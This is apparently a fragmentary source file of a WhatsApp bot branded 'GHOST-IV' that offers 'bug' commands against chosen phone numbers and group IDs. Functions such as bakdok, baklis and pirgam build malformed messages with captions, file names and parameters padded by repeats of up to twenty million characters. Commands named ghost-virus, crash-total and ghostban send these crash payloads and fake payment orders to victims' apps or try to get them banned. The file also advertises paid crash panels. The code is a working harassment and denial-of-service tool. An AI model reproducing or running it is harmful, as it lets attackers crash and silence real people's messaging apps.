...
// PERINTAH IN CONSOLE
if (isCmd) {
console.log(chalk.white.bgRed.bold('Massage'), color(`[𝑮𝑯𝑶𝑺𝑻-I𝛁H]`, `green`), color(`FROM`, `red`), color(`${pushname}`, `red`), color(`Text :`, `yellow`), color(`${body}`, `blue`))
}
        // HARI
...
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍₵Ɽ₳₴Ⱨ̿╮⭑ ☠️⃰͜͡؜𝐉𝐅𝐋𝐄𝐗 𝐎𝐆🔥᜴#𝐆𝐇𝐎𝐒𝐓-I𝛁ཀ͜͡😈⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
...
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍₵Ɽ₳₴Ⱨ╮⭑ ☠️⃰͜͡؜źømbî🔥᜴ # 𝐉𝐅𝐋𝐄𝐗 𝐎𝐆999ཀ͜͡😈⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
...
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"description": `⟠ 𝐆𝐇𝐎𝐒𝐓-IV🔥 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々`,
"currencyCode": "IDR",
...
"message": {
"groupInviteMessage": {
"groupJid": "255786535571-1616169743@g.us",
"inviteCode": "m",
...
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET: jflexog@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://github.com/marry2001
...
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️࿆᷍🥷᜴͆𝐉𝐅𝐋𝐄𝐗 𝐎𝐆╮⭑ ☠️⃰͜͡؜𝐉𝐅𝐋𝐄𝐗 𝐎𝐆🔥᜴▴𝒟𝐸𝐿𝒯𝒜𝒞𝑅𝒜𝒮𝐻ཀ͜͡😈⃟╮.xp`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
...
async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    ...
    "fileName": `✳️᜴࿆͆᷍𝐉𝐅𝐋𝐄𝐗 𝐎𝐆╮⭑ ☠️⃰͜͡؜𝐉𝐅𝐋𝐄𝐗 𝐎𝐆🔥᜴▴𝐉𝐅𝐋𝐄𝐗 𝐎𝐆ཀ͜͡🔥🔥⃟╮.xp`+"ྦྷ".repeat(60000),
...
async function pirgam(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "🩸⃟༑⌁⃰ǥh๏$ţȼяą$hώhąţ$ąρρཀ͜͡🦠",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/9467302a357fef605a76b.jpg" } }, { upload: deltaxcrash.waUploadToServer }))
      },
      body: {
        text: ""
      },
...
async function baklis(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "⟠ 𝐆𝐇𝐎𝐒𝐓-IV ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々"+" ".repeat(920000),
        'footerText': `✳️᜴࿆͆᷍‧₊˚ ⋅♡𝐉𝐅𝐋𝐄𝐗 𝐎𝐆 ࣪ ִֶָ☾.•₵Ɽ₳₴Ⱨ̿╮⭑ ☠️⃰͜͡𝐆𝐇𝐎𝐒𝐓-IV🔥᜴▴‧₊˚ ⋅♡𝐉𝐅𝐋𝐄𝐗 𝐎𝐆 ࣪ ִֶָ☾.Ӿ99ཀ͜͡😈⃟╮.xp`,
        'description': `✳️᜴࿆͆᷍‧₊˚ ⋅♡𝐉𝐅𝐋𝐄𝐗 𝐎𝐆 ࣪ ִֶָ☾.•₵Ɽ₳₴Ⱨ╮⭑ ☠️⃰͜͡؜𝐆𝐇𝐎𝐒𝐓-IV🔥᜴▴‧₊˚ ⋅♡𝐉𝐅𝐋𝐄𝐗 𝐎𝐆 ࣪ ִֶָ☾.Ӿ99ཀ͜͡😈⃟╮.xp`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
...
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://telegra.ph/file/9467302a357fef605a76b.jpg", 
"sourceUrl": " " }}}, { quoted: m }) }
...
'message': {
"stickerMessage": {
"url": "https://chat.whatsapp.com/LjPBSY8dmlPGUq5i5EjhvB",
...
"message": {
"audioMessage": {
"url": "https://chat.whatsapp.com/LjPBSY8dmlPGUq5i5EjhvB95n87cdnDuPQ&oe=6489D172&mms3=true",
"mimetype": "audio/mp4",
	           ...
	           text: menu,
                    contextInfo: {
                        externalAdReply: {
                            ...
                            thumbnailUrl: 'https://i.imgur.com/5FlhpTr.jpeg', 
                            sourceUrl: global.isLink,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
...
let itsmenu = `
 ...
 ╭─────❐  ⌜ 𝑮𝑯𝑶𝑺𝑻-I𝛁 ⌟  ❐───
 │
 │   *😈𝔚𝔢𝔩𝔠𝔬𝔪𝔢 𝔱𝔬 ℌ𝔢𝔩𝔩 @${sender.split("@")[0]}👻*
 │
 ╰──────────────────
...
│  ✪ ${prefix}мoвιleвυgѕ
│  ✪ ${prefix}ѕaмѕυngвυgѕ
│  ✪ ${prefix}gнoѕт-wнaтѕapp-вan 
╰───────────────────
 ©𝐉𝐅𝐋𝐄𝐗 𝐎𝐆
  ` 
  deltaxcrash.sendMessage(m.chat, {
                        video: { url: `https://telegra.ph/file/2895c1638c2aea583db79.mp4`},
                        caption: itsmenu,
                        gifPlayback: true
                    }, {
                        quoted: m
...
┃⬮ virus-id <255##>,amount
┃⬮ reset-ui <255##>,amount
┃⬮ ghost1 <254xxx>,amount
┃⬮ ghost2 <255##>,amount
┃⬮ kill-ghost <255##>,amount
┃⬮ ghost-boom <255##>,amount
┃⬮ ghost-web <255##>,amount
┃⬮ ghost <255##>
┃⬮ bug-engine
┃⬮ ghostx <255##>,amount
┃⬮ ghostx2 <255##>,amount
	           ...
	           text: menya,
                    contextInfo: {
                        externalAdReply: {
                            ...
                            title: global.namabot,
                            body: global.namaCreator,
                            thumbnailUrl: 'https://i.imgur.com/APYTsaG.jpeg', 
                            sourceUrl: global.isLink,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
	           ...
	           text: menyu,
                    contextInfo: {
                           ...
                           externalAdReply: {
                            ...
                            title: global.namabot,
                            body: global.namaCreator,
                            thumbnailUrl: 'https://i.imgur.com/0DrJgch.jpeg', 
                            sourceUrl: global.isLink,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
...
deltaxcrash.sendMessage(from, { text : `Hello @${sender.split("@")[0]}, My owner is 𝐉𝐅𝐋𝐄𝐗 𝐎𝐆`, contextInfo:{
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid:[sender]
}}, { quoted: repf })
...
case 'self': {
if (!isOwner) return reply(`YOUR NOT 𝐉𝐅𝐋𝐄𝐗 𝐎𝐆 SO DON'T WASTE YOUR TIME`)
...
break;
case 'mobile': case 'mobile1': case 'mobile2': case 'mobile3': {
if (!isPremium) return reply(`add yourself premium before trying again`)
if (!q) return reply(`use .${command} 255694039542`)
...
break
case "ghostban1":{
if (!isPremium) return reply(`only 𝐆𝐇𝐎𝐒𝐓 members can use this command`)
...
https://api.whatsapp.com/send?phone=+255`
await reply(mtban2);
}
break
case "ghostban2":{
...
case 'buypanel': {
if (!isPremium) return reply(`ONLY 𝐉𝐅𝐋𝐄𝐗 𝐎𝐆 CAN USE THIS COMMAND 👻`)
let url = q.split(" ")[0]
let time = q.split(" ")[1]
...
jpegThumbnail: `https://telegra.ph/file/9467302a357fef605a76b.jpg`,
title: `𝐆𝐇𝐎𝐒𝐓-IV`,
body: `⁗ ⋄Target down 💀🥹`,
previewType: "VIDEO",
sourceUrl: `༑ 𝐉𝐅𝐋𝐄𝐗 𝐎𝐆🧛‍♂️𝐆𝐇𝐎𝐒𝐓-I𝐕⿻`,
mediaType: 1,
mediaUrl: 'https://chat.whatsapp.com/LjPBSY8dmlPGUq5i5EjhvB'
}
},
text: '𝙏𝙖𝙧𝙜𝙚𝙩 𝙝𝙖𝙨 𝙗𝙚𝙚𝙣 𝙚𝙡𝙞𝙢𝙞𝙣𝙖𝙩𝙚𝙙 𝘽𝙮 *𝐆𝐇𝐎𝐒𝐓-IV* 𝘽𝙮  𝐉𝐅𝐋𝐄𝐗 𝐎𝐆 '
}, {
quoted: m
})
}
...
if (!q) return reply(`use .${command} 255694039542|1\n#  300.seconds`)
let ppek = q.split("|")[0]
...
await reply('✅Succes sent by 𝐆𝐇𝐎𝐒𝐓-IV')
}
break
case 'ghost-chace': {
if (!isPremium) return reply(mess.premium)
...
let teks22 = `LIST HARGA PANEL 𝐆𝐇𝐎𝐒𝐓-IV CRASH\n\n 8 GB 5K \n UNLI 10K\n\n spesifikasi panel\n ram 16 gb\n room 200 gb \n anti delay`
const buf = await getBuffer(`https://telegra.ph/file/9467302a357fef605a76b.jpg`)
for (let x of data) {
...
case "addowner":
if (!isOwner) return reply(`YOUR NOT 𝐉𝐅𝐋𝐄𝐗 𝐎𝐆 SO DON'T WASTE YOUR TIME`)
if (!args[0]) return reply(`Use ${prefix+command} number\nContact ${prefix+command} 255786535571`)
...
break;
case "addprem":{
if (!isOwner) return reply(`YOUR NOT 𝐉𝐅𝐋𝐄𝐗 𝐎𝐆!!! MOTHER FACKER💀`)
if (!args[0]) return reply(`Use ${prefix+command} number\nContact ${prefix+command} 255786535571`)
...
break
//=================================================//
case '🧛‍♂️': case 'ghost-virus': case 'crash-total': case '🔥': {
...
if (!isPremium) return reply('_</> only 𝐆𝐇𝐎𝐒𝐓 members can use this command')
if (!q) return reply(`Use .${command} 255786535571`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> The number starts with the number 0. Replace it with the number that starts with it country code\n\n<✓> Example : .${command} 25473123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> Bugs have been sent... `)
...
break
  ...
  const pingMsg = await deltaxcrash.sendMessage(m.chat, { text: '*𝐉𝐅𝐋𝐄𝐗 𝐎𝐆 😈💀☠️*' });
 ...
 await deltaxcrash.relayMessage(m.chat, {
      protocolMessage: {
        ...
        type: 14,
        editedMessage: {
          conversation: `𝑮𝑯𝑶𝑺𝑻 👻 ★ 𝑺𝑷𝑬𝑬𝑫 ➟* *${new Date() - startTime}* ᴍs `
        }
      }
    }, {});
  } 
break
	case "runtime":
                let pinga = ` 𝐆𝐇𝐎𝐒𝐓-IV ɦαร ɓεεɳ αcƭเѵε ƒσɾ ${runtime(process.uptime())}`
               deltaxcrash.sendMessage(m.chat, {
                    text: pinga,
                    contextInfo: {
                        externalAdReply: {
                            ...
                            title: `𝐆𝐇𝐎𝐒𝐓-IV`,
                            body: `𝐉𝐅𝐋𝐄𝐗 𝐎𝐆`,
                            thumbnailUrl: 'https://telegra.ph/file/9467302a357fef605a76b.jpg',
                            sourceUrl: 'https://chat.whatsapp.com/LjPBSY8dmlPGUq5i5EjhvB',
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
...
message: {
  "interactiveMessage": {
    ...
    "body": {
      "text": "🩸⃟༑⌁⃰𝐆𝐇𝐎𝐒𝐓-IV ₵Ɽ₳₴Ⱨ Ꮤ𐋅𐌀𐌕𐌔𐌀𐌓𐌓 ᭢ꫀ᭙ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #𝐆𝐇𝐎𝐒𝐓-IV crash"
    },
...
message: {
  "interactiveMessage": {
    ...
    "body": {
      "text": "🩸⃟༑⌁⃰𝐆𝐇𝐎𝐒𝐓-IV 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
    },
    "footer": {
    ...
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻𝐉𝐅𝐋𝐄𝐗 𝐎𝐆⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  ...
  "interactiveMessage": {
    ...
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻𝐆𝐇𝐎𝐒𝐓⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(20000000)
    }
...
if (!isPremium) return reply('_</> Can only be used by premium users..._')
if (!q) return reply(`Use .${command} 1962623825471@g.us`)
reply(`</> Bugs have been sent... `)
target = q
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
  ...
  "interactiveMessage": {
    ...
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻𝑮𝑯𝑶𝑺𝑻-I𝛁⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
